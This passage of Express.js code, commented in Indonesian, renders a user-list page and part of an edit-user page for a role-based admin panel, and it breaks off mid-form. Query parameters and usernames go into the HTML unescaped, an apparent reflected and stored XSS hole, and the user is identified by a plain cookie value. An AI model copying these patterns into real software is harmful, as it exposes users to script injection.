app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });
    
    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));
    
    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;
    
    if (user.username === username) {
      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }
    
    const editButton = canEdit 
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;
    
    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  const html = `
   <!DOCTYPE html>
<html lang="id">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User List - DIGITAL CORE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@500;600;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>

  <style>
    :root {
      --primary: #00d2ff;
      --secondary: #3a7bd5;
      --accent: #00f2fe;
      --gold: #FFD700;
      --bg-dark: #050505;
      --glass: rgba(255, 255, 255, 0.03);
      --glass-border: rgba(255, 255, 255, 0.1);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: var(--bg-dark);
      color: #FFFFFF;
      min-height: 100vh;
      padding: 40px 20px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
      /* Background Glow Gradient */
      background-image: 
          radial-gradient(circle at 50% -20%, rgba(0, 210, 255, 0.15) 0%, transparent 50%),
          radial-gradient(circle at 0% 100%, rgba(58, 123, 213, 0.1) 0%, transparent 40%);
    }

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      opacity: 0.4;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1100px;
      margin: 0 auto;
    }

    /* Header Mewah */
    .header {
      text-align: center;
      margin-bottom: 40px;
      padding: 20px;
    }

    .header h2 {
      font-family: 'Orbitron', sans-serif;
      font-size: 38px;
      font-weight: 700;
      background: linear-gradient(to right, #fff, var(--primary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      letter-spacing: 5px;
      margin-bottom: 15px;
      filter: drop-shadow(0 0 15px rgba(0, 210, 255, 0.4));
    }

    .header p {
      color: rgba(255, 255, 255, 0.5);
      font-size: 14px;
      letter-spacing: 3px;
      text-transform: uppercase;
      font-weight: 300;
    }

    /* Stats Bar High-Tech */
    .stats-bar {
      display: flex;
      justify-content: space-around;
      margin-bottom: 35px;
      padding: 30px;
      background: rgba(15, 15, 15, 0.6);
      border: 1px solid var(--glass-border);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border-radius: 25px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
      animation: fadeIn 0.8s ease-out;
    }

    .stat-item {
      text-align: center;
      position: relative;
      flex: 1;
    }

    .stat-item:not(:last-child)::after {
      content: "";
      position: absolute;
      right: 0;
      top: 20%;
      height: 60%;
      width: 1px;
      background: linear-gradient(transparent, rgba(255,255,255,0.1), transparent);
    }

    .stat-value {
      font-family: 'Rajdhani', sans-serif;
      font-size: 34px;
      font-weight: 700;
      color: var(--primary);
      display: block;
      text-shadow: 0 0 12px rgba(0, 210, 255, 0.5);
    }

    .stat-label {
      font-size: 11px;
      color: rgba(255, 255, 255, 0.4);
      text-transform: uppercase;
      font-weight: 600;
      letter-spacing: 2px;
      margin-top: 5px;
    }

    /* Table Container - Ultra Glass */
    .table-container {
      overflow-x: auto;
      border-radius: 25px;
      border: 1px solid var(--glass-border);
      background: rgba(10, 10, 10, 0.4);
      backdrop-filter: blur(25px);
      -webkit-backdrop-filter: blur(25px);
      margin-bottom: 35px;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      animation: fadeInUp 1s ease-out;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 800px;
    }

    th {
      background: rgba(255, 255, 255, 0.03);
      padding: 22px 20px;
      text-align: left;
      color: var(--primary);
      font-family: 'Orbitron', sans-serif;
      font-weight: 600;
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }

    td {
      padding: 22px 20px;
      color: rgba(255, 255, 255, 0.8);
      font-size: 14px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
      font-family: 'Rajdhani', sans-serif;
      font-weight: 500;
      letter-spacing: 0.5px;
    }

    tr:hover td {
      background: rgba(255, 255, 255, 0.03);
      color: #fff;
      transition: all 0.3s ease;
    }

    /* Badges Glow */
    .role-badge {
      display: inline-block;
      padding: 6px 14px;
      border-radius: 8px;
      font-size: 10px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1px;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }

    .role-owner { background: linear-gradient(45deg, #FFD700, #FFA500); color: #000; box-shadow: 0 0 15px rgba(255, 215, 0, 0.3); }
    .role-admin { background: linear-gradient(45deg, #FF4B2B, #FF416C); color: #fff; box-shadow: 0 0 15px rgba(255, 75, 43, 0.3); }
    .role-reseller { background: linear-gradient(45deg, #00B4DB, #0083B0); color: #fff; box-shadow: 0 0 15px rgba(0, 180, 219, 0.3); }
    .role-user { background: linear-gradient(45deg, #11998e, #38ef7d); color: #fff; box-shadow: 0 0 15px rgba(56, 239, 125, 0.3); }

    /* Action Buttons */
    .btn-edit {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 8px 16px;
      background: rgba(0, 210, 255, 0.1);
      border: 1px solid rgba(0, 210, 255, 0.3);
      border-radius: 10px;
      color: var(--primary);
      text-decoration: none;
      font-size: 12px;
      font-weight: 600;
      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    .btn-edit:hover {
      background: var(--primary);
      color: #000;
      box-shadow: 0 0 20px var(--primary);
      transform: scale(1.05);
    }

    /* Close Button - Premium Style */
    .close-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      width: fit-content;
      min-width: 240px;
      padding: 18px 30px;
      margin: 40px auto;
      background: rgba(255, 255, 255, 0.05);
      color: #FFFFFF;
      text-align: center;
      border-radius: 18px;
      text-decoration: none;
      font-family: 'Orbitron', sans-serif;
      font-size: 12px;
      font-weight: 700;
      letter-spacing: 2px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      cursor: pointer;
      transition: all 0.4s ease;
      text-transform: uppercase;
    }

    .close-btn:hover {
      background: rgba(255, 255, 255, 0.1);
      border-color: #fff;
      transform: translateY(-5px);
      box-shadow: 0 10px 25px rgba(255, 255, 255, 0.1);
    }

    /* Animations */
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(40px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    /* Responsive Customization */
    @media (max-width: 768px) {
      .header h2 { font-size: 26px; }
      .stats-bar {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 20px;
        padding: 20px;
      }
      .stat-item:not(:last-child)::after { display: none; }
      .stat-value { font-size: 26px; }
    }

    /* Scrollbar minimalis ala macOS */
    .table-container::-webkit-scrollbar {
      height: 6px;
    }
    .table-container::-webkit-scrollbar-thumb {
      background: var(--primary);
      border-radius: 10px;
    }
    .table-container::-webkit-scrollbar-track {
      background: transparent;
    }
  </style>
</head>

<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-project-diagram"></i> USER CENTRAL</h2>
      <p>Management Console & System Directory</p>
    </div>

    ${messageHtml}

    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Nodes</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Regular Entities</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Authorized Resellers</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">System Supervisors</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-id-card"></i> Identity</th>
            <th><i class="fas fa-shield-halved"></i> Security Tier</th>
            <th><i class="fas fa-calendar-times"></i> Termination</th>
            <th><i class="fas fa-microchip"></i> Uptime Left</th>
            <th><i class="fas fa-terminal"></i> Command</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-power-off"></i> EXIT DIRECTORY
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#1a1a1a',
        lineColor: '#1a1a1a',
        minSpeedX: 0.1,
        maxSpeedX: 0.4,
        density: 12000,
        particleRadius: 3,
        curvedLines: true,
        proximity: 110
      });
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});

app.get("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const currentUsername = username;
  const targetUsername = req.query.username;

  // Jika tidak ada parameter username, tampilkan form kosong atau redirect
  if (!targetUsername || targetUsername === 'undefined' || targetUsername === 'null') {
    const errorHtml = `
    <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Error - DIGITAL CORE</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  
  <style>
    :root {
      --primary: #00d2ff;
      --warning: #ffcc00;
      --bg-dark: #050505;
      --glass: rgba(255, 255, 255, 0.03);
      --glass-border: rgba(255, 255, 255, 0.1);
    }

    body { 
      font-family: 'Inter', sans-serif; 
      background: var(--bg-dark); 
      color: #fff; 
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      /* Background Glow */
      background-image: 
          radial-gradient(circle at 50% 50%, rgba(0, 210, 255, 0.1) 0%, transparent 70%);
    }

    /* Background Animation */
    body::before {
      content: "";
      position: absolute;
      width: 200%;
      height: 200%;
      background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
      opacity: 0.1;
      z-index: -1;
    }

    .error { 
      position: relative;
      background: rgba(15, 15, 15, 0.7); 
      backdrop-filter: blur(25px);
      -webkit-backdrop-filter: blur(25px);
      padding: 50px 40px; 
      border-radius: 30px; 
      border: 1px solid var(--glass-border);
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8), 
                  inset 0 0 20px rgba(255, 255, 255, 0.02);
      max-width: 450px;
      width: 90%;
      text-align: center;
      animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1);
    }

    /* Glow Top Line */
    .error::after {
      content: "";
      position: absolute;
      top: 0; left: 50%;
      transform: translateX(-50%);
      width: 40%;
      height: 3px;
      background: var(--primary);
      box-shadow: 0 0 15px var(--primary);
      border-radius: 0 0 10px 10px;
    }

    .icon-container {
      font-size: 50px;
      margin-bottom: 20px;
      color: var(--warning);
      filter: drop-shadow(0 0 10px rgba(255, 204, 0, 0.4));
      animation: pulse 2s infinite;
    }

    h2 {
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 22px;
      margin-bottom: 20px;
      letter-spacing: 2px;
      text-transform: uppercase;
      background: linear-gradient(to right, #fff, #888);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    p {
      color: rgba(255, 255, 255, 0.6);
      line-height: 1.8;
      font-size: 14px;
      margin-bottom: 10px;
    }

    small {
      display: inline-block;
      padding: 5px 15px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 8px;
      margin-top: 15px;
      color: rgba(255, 255, 255, 0.3);
      font-family: 'Courier New', monospace;
      font-size: 11px;
      letter-spacing: 1px;
    }

    /* Tombol Luxury */
    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 16px 32px;
      background: linear-gradient(45deg, var(--primary), #3a7bd5);
      color: #fff;
      text-decoration: none;
      border-radius: 16px;
      margin-top: 30px;
      font-weight: 700;
      font-family: 'Orbitron', sans-serif;
      font-size: 12px;
      letter-spacing: 1px;
      transition: all 0.3s ease;
      box-shadow: 0 10px 20px rgba(0, 210, 255, 0.2);
      border: none;
      text-transform: uppercase;
    }

    .btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 30px rgba(0, 210, 255, 0.4);
      filter: brightness(1.1);
    }

    .btn:active {
      transform: scale(0.96);
    }

    /* Link Style Override */
    a[style*="color: #4ECDC4"] {
      color: var(--primary) !important;
      text-decoration: none;
      font-weight: 600;
      border-bottom: 1px dashed var(--primary);
      transition: 0.3s;
    }

    a[style*="color: #4ECDC4"]:hover {
      color: #fff !important;
      border-bottom-style: solid;
    }

    /* Animations */
    @keyframes slideUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.8; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="error">
    <div class="icon-container">
      <i class="fas fa-exclamation-triangle"></i>
    </div>
    <h2>📝 Edit User</h2>
    <p>Silakan pilih user yang ingin diedit dari <a href="/userlist" style="color: #4ECDC4;">User List</a></p>
    <p><small>STATUS: IDENTITY_PARAMETER_MISSING</small></p>
    
    <a href="/userlist" class="btn">
      <i class="fas fa-chevron-left"></i> Return to Directory
    </a>
  </div>
</body>
</html>
    `;
    return res.send(errorHtml);
  }

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    const errorHtml = `
    <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Error - DIGITAL CORE</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  
  <style>
    :root {
      --error-red: #ff3b30;
      --error-glow: rgba(255, 59, 48, 0.4);
      --bg-dark: #050505;
      --glass: rgba(255, 255, 255, 0.03);
      --glass-border: rgba(255, 255, 255, 0.1);
    }

    body { 
      font-family: 'Inter', sans-serif; 
      background: var(--bg-dark); 
      color: #fff; 
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      /* Background Glow Gradient */
      background-image: 
          radial-gradient(circle at 50% 50%, rgba(255, 59, 48, 0.08) 0%, transparent 70%),
          radial-gradient(circle at 0% 0%, rgba(10, 132, 255, 0.05) 0%, transparent 50%);
    }

    /* Decorative Rings */
    body::before {
      content: "";
      position: absolute;
      width: 500px;
      height: 500px;
      border: 1px solid rgba(255, 59, 48, 0.1);
      border-radius: 50%;
      z-index: 0;
      animation: pulseRing 4s infinite;
    }

    .error { 
      position: relative;
      z-index: 1;
      background: rgba(15, 15, 15, 0.7); 
      backdrop-filter: blur(30px);
      -webkit-backdrop-filter: blur(30px);
      padding: 60px 40px; 
      border-radius: 40px; 
      border: 1px solid var(--glass-border);
      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 
                  inset 0 0 30px rgba(255, 59, 48, 0.05);
      max-width: 450px;
      width: 90%;
      text-align: center;
      animation: scaleIn 0.5s cubic-bezier(0.23, 1, 0.32, 1);
    }

    /* Glow Indicator on top */
    .error-header-line {
      position: absolute;
      top: 0; left: 50%;
      transform: translateX(-50%);
      width: 100px;
      height: 4px;
      background: var(--error-red);
      box-shadow: 0 0 20px var(--error-red);
      border-radius: 0 0 10px 10px;
    }

    .icon-error {
      font-size: 60px;
      color: var(--error-red);
      margin-bottom: 25px;
      filter: drop-shadow(0 0 15px var(--error-glow));
      animation: iconShake 2s infinite;
    }

    h2 {
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 20px;
      margin-bottom: 20px;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: #fff;
    }

    p {
      color: rgba(255, 255, 255, 0.6);
      line-height: 1.8;
      font-size: 15px;
      margin-bottom: 15px;
    }

    strong {
      color: var(--error-red);
      background: rgba(255, 59, 48, 0.1);
      padding: 4px 10px;
      border-radius: 8px;
      font-family: 'Orbitron', sans-serif;
      font-size: 13px;
      border: 1px solid rgba(255, 59, 48, 0.2);
    }

    /* Luxury Button */
    .btn-back {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin-top: 35px;
      padding: 18px 35px;
      background: linear-gradient(135deg, #ffffff 0%, #e0e0e0 100%);
      color: #000000;
      text-decoration: none;
      border-radius: 20px;
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 13px;
      letter-spacing: 1px;
      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
      border: none;
    }

    .btn-back:hover {
      transform: translateY(-5px);
      box-shadow: 0 15px 30px rgba(255, 255, 255, 0.1);
      filter: brightness(1.1);
    }

    .btn-back:active {
      transform: scale(0.95);
    }

    .link-list {
      color: #0a84ff;
      text-decoration: none;
      font-weight: 600;
      border-bottom: 1px solid transparent;
      transition: 0.3s;
    }

    .link-list:hover {
      color: #fff;
      border-bottom-color: #fff;
    }

    /* Animations */
    @keyframes scaleIn {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }

    @keyframes pulseRing {
      0% { transform: scale(0.8); opacity: 0.5; }
      50% { transform: scale(1.1); opacity: 0.2; }
      100% { transform: scale(0.8); opacity: 0.5; }
    }

    @keyframes iconShake {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
  </style>
</head>
<body>

  <div class="error">
    <div class="error-header-line"></div>
    <div class="icon-error">
      <i class="fas fa-user-slash"></i>
    </div>
    <h2>Data Not Found</h2>
    <p>User dengan username <strong>"${targetUsername}"</strong> tidak terdeteksi dalam database pusat.</p>
    <p>Silakan kembali ke <a href="/userlist" class="link-list">Main Directory</a></p>
    
    <a href="/userlist" class="btn-back">
      <i class="fas fa-arrow-left"></i> RE-SYNC DATABASE
    </a>
  </div>

</body>
</html>
    `;
    return res.send(errorHtml);
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒
  
  // 1. Tidak bisa edit akun sendiri
  if (targetUsername === currentUsername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (role === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (role === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // 🔒 Tentukan opsi role yang boleh diedit
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${targetUser.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${targetUser.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
    `;
  } else {
    // Reseller tidak bisa edit role
    roleOptions = `<option value="${targetUser.role}" selected>${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((targetUser.expired - now) / 86400000));
  const expiredText = new Date(targetUser.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  // HTML form edit user dengan tombol yang sudah dirapihin untuk mobile
  const html = `
  <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Edit User - DIGITAL CORE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@500;600;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    
    <style>
        :root {
            --primary: #00d2ff;
            --accent: #00f2fe;
            --danger: #ff453a;
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background: #050505;
            color: #FFFFFF;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 50% -20%, rgba(0, 210, 255, 0.15) 0%, transparent 50%);
        }

        #particles {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 0;
            opacity: 0.4;
        }

        .content {
            position: relative;
            z-index: 2;
            width: 100%;
            max-width: 480px;
            animation: fadeInUp 0.8s ease-out;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 32px;
            letter-spacing: 4px;
            background: linear-gradient(to right, #fff, var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
            filter: drop-shadow(0 0 10px rgba(0, 210, 255, 0.3));
        }

        .header p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        /* PREMIUM FORM CONTAINER */
        .form-container {
            background: rgba(15, 15, 15, 0.6);
            backdrop-filter: blur(25px) saturate(200%);
            -webkit-backdrop-filter: blur(25px) saturate(200%);
            border: 1px solid var(--glass-border);
            padding: 30px;
            border-radius: 35px;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7);
            position: relative;
            overflow: hidden;
        }

        .form-container::before {
            content: "";
            position: absolute;
            top: 0; left: 50%;
            transform: translateX(-50%);
            width: 60%; height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
        }

        /* USER INFO DECK */
        .user-info {
            background: rgba(255, 255, 255, 0.03);
            padding: 20px;
            border-radius: 20px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 13px;
            font-family: 'Rajdhani', sans-serif;
        }

        .info-label { color: rgba(255, 255, 255, 0.4); text-transform: uppercase; letter-spacing: 1px; }
        .info-value { color: #FFFFFF; font-weight: 600; letter-spacing: 0.5px; }

        /* BADGES */
        .role-badge {
            padding: 4px 12px;
            border-radius: 8px;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            box-shadow: 0 0 15px rgba(0,0,0,0.3);
        }

        .role-owner { background: linear-gradient(45deg, #FFD700, #FFA500); color: #000; }
        .role-admin { background: linear-gradient(45deg, #FF4B2B, #FF416C); color: #fff; }
        .role-reseller { background: linear-gradient(45deg, #00B4DB, #0083B0); color: #fff; }
        .role-user { background: linear-gradient(45deg, #11998e, #38ef7d); color: #fff; }

        .form-group { margin-bottom: 22px; }

        label {
            display: block;
            margin-left: 10px;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--primary);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-family: 'Orbitron', sans-serif;
        }

        /* LUXURY INPUTS */
        input, select {
            width: 100%;
            padding: 16px 20px;
            border-radius: 18px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            background: rgba(255, 255, 255, 0.04);
            color: #FFFFFF;
            font-size: 15px;
            transition: all 0.3s ease;
            font-family: 'Poppins', sans-serif;
        }

        input:focus, select:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.08);
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(0, 210, 255, 0.2);
        }

        /* BUTTONS */
        .button-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 30px;
        }

        .btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 20px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 12px;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            text-transform: uppercase;
        }

        .btn:active { transform: scale(0.96); }

        .btn-save {
            background: linear-gradient(45deg, #fff, #f0f0f0);
            color: #000;
            box-shadow: 0 10px 20px rgba(255, 255, 255, 0.1);
        }

        .btn-save:hover {
            box-shadow: 0 15px 30px rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
        }

        .btn-delete {
            background: rgba(255, 69, 58, 0.05);
            color: var(--danger);
            border: 1px solid rgba(255, 69, 58, 0.2);
        }

        .btn-delete:hover {
            background: var(--danger);
            color: #fff;
            box-shadow: 0 10px 20px rgba(255, 69, 58, 0.3);
        }

        .btn-back {
            background: transparent;
            color: rgba(255, 255, 255, 0.4);
            font-size: 10px;
            border: 1px solid rgba(255,255,255,0.05);
        }

        .btn-back:hover {
            color: #fff;
            background: rgba(255,255,255,0.05);
        }

        .warning-text { color: var(--danger) !important; text-shadow: 0 0 10px rgba(255, 69, 58, 0.4); }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
    </style>
</head>
<body>
    <div id="particles"></div>

    <div class="content">
        <div class="header">
            <h2>EDIT MODULE</h2>
            <p>Access Level: System Administrator</p>
        </div>

        <div class="form-container">
            <div class="user-info">
                <div class="info-row">
                    <span class="info-label">Identity:</span>
                    <span class="info-value">${targetUser.username}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Current Tier:</span>
                    <span class="info-value">
                        <span class="role-badge role-${targetUser.role}">
                            ${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}
                        </span>
                    </span>
                </div>
                <div class="info-row">
                    <span class="info-label">Termination Date:</span>
                    <span class="info-value">${expiredText}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Active Status:</span>
                    <span class="info-value ${sisaHari <= 7 ? 'warning-text' : ''}">${sisaHari} Cycles Left</span>
                </div>
            </div>

            <form method="POST" action="/edituser">
                <input type="hidden" name="oldusername" value="${targetUser.username}">
                
                <div class="form-group">
